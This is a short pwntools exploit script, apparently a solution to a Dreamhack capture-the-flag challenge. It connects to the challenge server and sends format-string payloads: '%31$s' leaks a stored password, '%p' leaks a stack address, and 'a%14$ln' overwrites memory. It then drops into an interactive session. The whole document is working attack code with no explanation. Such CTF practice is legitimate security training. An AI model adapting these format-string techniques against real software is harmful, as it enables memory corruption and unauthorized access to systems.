from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 22295
r = remote(HOST, PORT)

r.sendlineafter(b'>> ', b'2')
r.sendlineafter(b': ', b'%31$s')
password = u64(r.recvuntil(b' ').strip().ljust(8,b'\x00'))

r.sendlineafter(b'>> ', b'2')
r.sendlineafter(b': ', p64(password))
r.sendlineafter(b': ', b'wyv3rn\x00')

r.sendlineafter(b'>> ', b'2')
r.sendlineafter(b': ', b'%p')

stack=int(r.recvuntil(b' ').strip().decode(),16)+0xb4

r.sendlineafter(b'>> ', b'2')
r.sendlineafter(b': ', p64(password))
r.sendlineafter(b': ', p64(stack))

r.sendlineafter(b'>> ', b'2')
r.sendlineafter(b': ', b'a%14$ln')

r.sendlineafter(b'>> ', b'3')

r.interactive()